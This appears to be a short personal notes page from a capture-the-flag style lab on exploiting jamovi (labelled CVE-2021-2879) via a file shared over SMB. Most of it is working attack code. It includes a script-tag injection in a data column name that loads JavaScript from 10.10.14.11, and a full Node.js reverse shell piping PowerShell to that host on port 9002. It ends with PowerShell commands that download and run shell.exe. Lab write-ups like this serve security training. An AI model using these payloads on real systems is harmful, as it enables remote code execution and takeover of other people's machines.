# SMB

![[Pasted image 20210820155938.png]]


# CVE-2021-2879

https://www.youtube.com/watch?v=x94W2kzoBbc

* Take one of the files and modify the column name with 

```html
<script src="http://10.10.14.11/jamovi.js" />
```

![[Pasted image 20210820160109.png]]

* jamovi.js

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("powershell", []);
    var client = new net.Socket();
    client.connect(9002, "10.10.14.11", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
``` 

* Upload back to the SMB and wait for the HIT

![[Pasted image 20210820160140.png]]

* Imediately run

```powershell
cd \windows\temp
wget http://10.10.14.11/shell.exe -o shell.exe
.\shell.exe
```